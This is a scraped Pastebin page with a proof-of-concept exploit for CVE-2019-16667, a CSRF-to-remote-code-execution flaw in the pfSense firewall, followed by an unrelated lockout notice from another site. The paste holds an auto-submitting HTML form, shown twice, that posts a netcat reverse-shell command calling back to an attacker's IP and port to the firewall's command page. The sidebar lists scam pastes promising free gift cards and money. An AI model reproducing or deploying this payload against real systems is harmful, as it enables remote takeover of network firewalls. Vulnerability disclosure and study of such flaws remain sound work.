=== Content from pastebin.com_449a718d_20250121_005316.html ===


[Pastebin](/)
[API](/doc_api)
[tools](/tools)
[faq](/faq)

[paste](/)

[Login](/login)
[Sign up](/signup)

SHARE
TWEET

![Guest User](/themes/pastebin/img/guest.png)
# pfsense CSRF POC (cve-2019-16667)

a guest
Sep 26th, 2019

6,367
0
Never
[Add comment](/login?return_url=%2FTEJdu9LN%23add_comment)

**Not a member of Pastebin yet?**
[**Sign Up**](/signup),
it unlocks many cool features!

[text](/archive/text) 2.27 KB
| None
|
[0](/login?return_url=%2FTEJdu9LN "Like") [0](/login?return_url=%2FTEJdu9LN "Dislike")
[raw](/raw/TEJdu9LN)
[download](/dl/TEJdu9LN)
[clone](/clone/TEJdu9LN)
[embed](/embed/TEJdu9LN)
[print](/print/TEJdu9LN)
[report](/report/TEJdu9LN)

1. github repo :- https://github.com/pfsense/pfsense
3. The pfsense firewall is vulnerable to RCE chained with CSRF as it uses
4. `csrf magic` library since it allows to tamper the CSRF token values submited when processing the
5. form requests. Due to this flaw, an attacker can exploit this vulnerability by crafting new page that
6. contains attakcer's controlled input such as a "reverseshell" (eg: `rm /tmp/f;mkfifo /tmp/f;cat
7. /tmp/f|/bin/sh -i 2>&1|nc attackerip port >/tmp/f`token value) in the form and entice the victims to click
8. on the crafted link via social engineering methods. Once the victim clicks on the link (try again button
9. in this case), attacker can take the lateral control of the victim's machine and malicious actions can be
10. performed on victim's behalf.
12. <!DOCTYPE html>
13. <html>
14. <body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
15. <form id="myForm" action="http://pfsense/diag\_command.php" method="POST">
16. <input type=hidden name="txtCommand" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4433 >/tmp/f">
17. <input type=hidden name="txtRecallBuffer" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4433 >/tmp/f">
18. <input type=hidden name="dlPath" value="">
19. <input type=hidden name="txtPHPCommand" value="">
20. <input type="hidden" name="submit" value="EXEC">
21. </form>
22. </body>
23. </html>
25. Steps to Reproduce :-
26. Create a malicious page containing the below values and user will be redirected to
27. https://pfsense/diag\_command.php page.
28. <!DOCTYPE html>
29. <html>
30. <body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
31. <form id="myForm" action="http://pfsense/diag\_command.php" method="POST">
32. <input type=hidden name="txtCommand" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4433 >/tmp/f">
33. <input type=hidden name="txtRecallBuffer" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4433 >/tmp/f">
34. <input type=hidden name="dlPath" value="">
35. <input type=hidden name="txtPHPCommand" value="">
36. <input type="hidden" name="submit" value="EXEC">
37. </form>
38. </body>
39. </html>
41. You will be greeted with the message as shown below.
43. Once cliked on the Try again button you will be greeted with reverse shell of the victim.

Add Comment
Please, [**Sign In**](/login?return_url=%2FTEJdu9LN%23add_comment) to add comment

[Public Pastes](/archive)

* [⭐ get any gift card for FREE⭐ O4](/9Mc8YqVy)
  JavaScript |
  5 sec ago
  | 0.18 KB
* [⭐️ EARN $500 INSTANTLY⭐ 7C](/UrDrw821)
  JavaScript |
  6 sec ago
  | 0.18 KB
* [⭐ get any gift card for FREE⭐ 90](/Ri6emrqt)
  JavaScript |
  11 sec ago
  | 0.18 KB
* [⭐️ EARN $500 INSTANTLY⭐ QM](/00Qtm49N)
  JavaScript |
  12 sec ago
  | 0.18 KB
* [⭐️ EARN $500 INSTANTLY LR](/hajE9XBz)
  JavaScript |
  13 sec ago
  | 0.18 KB
* [⭐️ EARN $500 INSTANTLY QN](/i9DgiYWG)
  JavaScript |
  19 sec ago
  | 0.18 KB
* [⭐ FREE giftcards method 3R](/8EKB6hvN)
  JavaScript |
  19 sec ago
  | 0.18 KB
* [⭐ FREE giftcards method⭐ Q8](/mPiR2h3X)
  JavaScript |
  21 sec ago
  | 0.18 KB

[create new paste](/)  /
[syntax languages](/languages)  /
[archive](/archive)  /
[faq](/faq)  /
[tools](/tools)  /
[night mode](/night_mode)  /
[api](/doc_api)  /
[scraping api](/doc_scraping_api)  /
[news](/news)  /
[pro](/pro)

[privacy statement](/doc_privacy_statement)  /
[cookies policy](/doc_cookies_policy)  /
[terms of service](/doc_terms_of_service) /
[security disclosure](/doc_security_disclosure)  /
[dmca](/dmca)  /
[report abuse](/report-abuse)  /
[contact](/contact)

By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.

Site design & logo © 2025 Pastebin

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy).  OK, I Understand

[![](/themes/pastebin/img/hello.webp)](/signup)

Not a member of Pastebin yet?



=== Content from packetstormsecurity.com_c141fe11_20250121_005315.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
